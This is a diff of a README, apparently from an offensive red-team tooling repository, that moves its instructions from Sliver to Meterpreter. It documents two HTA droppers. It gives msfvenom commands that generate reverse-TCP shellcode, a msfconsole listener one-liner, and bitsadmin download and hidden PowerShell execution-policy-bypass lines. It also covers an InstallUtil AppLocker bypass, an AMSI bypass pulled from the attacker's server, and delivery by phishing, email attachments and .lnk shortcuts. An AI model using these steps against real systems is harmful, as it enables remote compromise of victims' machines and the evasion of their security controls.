@@ -14,14 +14,14 @@
 
 | File | Placeholder | What it must be |
 |---|---|---|
-| `black.hta` | `shell.exe` | A **.NET InstallUtil payload** — a compiled C# assembly with a `[RunInstaller(true)]` installer class. **Not** a raw Go/Sliver implant: `InstallUtil.exe /U` only loads and executes *.NET* installer assemblies. |
-| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Sliver shellcode byte array (via `msfvenom -f ps1`), or a simple download cradle. |
+| `black.hta` | `shell.exe` | A **.NET InstallUtil payload** — a compiled C# assembly with a `[RunInstaller(true)]` installer class. **Not** a raw Go/Meterpreter implant: `InstallUtil.exe /U` only loads and executes *.NET* installer assemblies. |
+| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Meterpreter shellcode byte array (via `msfvenom -f ps1`), or a simple download cradle. |
 
 ### Why `black.hta` needs a .NET payload (not a Go implant)
 
 `InstallUtil.exe /U` is the .NET Assembly Installer tool. With `/U` it loads an assembly
-and invokes its installer class's `Uninstall()` method. A raw Sliver/Go implant
-(`sliver > generate ... --format exe`) is **not** a .NET assembly, so InstallUtil cannot
+and invokes its installer class's `Uninstall()` method. A raw Go/Meterpreter implant
+(`msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe`) is **not** a .NET assembly, so InstallUtil cannot
 run it.
 
 The repo already ships a ready-made .NET payload for this exact chain:
@@ -45,7 +45,7 @@ fresh runspace. See `word-macro/installutil-applocker-bypass/README.md`.
 ## black.hta
 
 > **`shell.exe` = your .NET InstallUtil payload** — compile `installutil.cs` from
-> `word-macro/installutil-applocker-bypass/`, **not** a Sliver/Go implant. At runtime
+> `word-macro/installutil-applocker-bypass/`, **not** a Go/Meterpreter implant. At runtime
 > `shell.exe` downloads `amsi.txt` + `run.txt` from your HTTP server and runs them in a
 > fresh runspace.
 
@@ -75,7 +75,7 @@ shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://<YOUR
 
 **5. Start your listener** (for whatever `run.txt` stages into):
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
 
 **6. Deliver to target** — email attachment, SMB share, phishing page, or `.lnk` shortcut pointing to `mshta.exe black.hta`.
@@ -84,13 +84,13 @@ sliver > mtls --lhost <IP> --lport 443
 
 ## red.hta
 
-> **`payload.ps1` = your in-memory PowerShell payload** (e.g. a Sliver PS1 shellcode runner
+> **`payload.ps1` = your in-memory PowerShell payload** (e.g. a Meterpreter PS1 shellcode runner
 > or a download cradle). No disk write.
 
-**1. Prepare `payload.ps1`** — e.g. generate Sliver shellcode, convert to a
+**1. Prepare `payload.ps1`** — e.g. generate Meterpreter shellcode, convert to a
 PowerShell array, then feed it into `ps-loaders/ps-shellcode-runner.ps1`:
 ```text
-sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o /tmp/sc.bin
 msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/payload.ps1
 ```
 
@@ -106,7 +106,7 @@ shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile
 
 **4. Start your listener:**
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
 
 **5. Deliver to target** — same delivery methods as above.
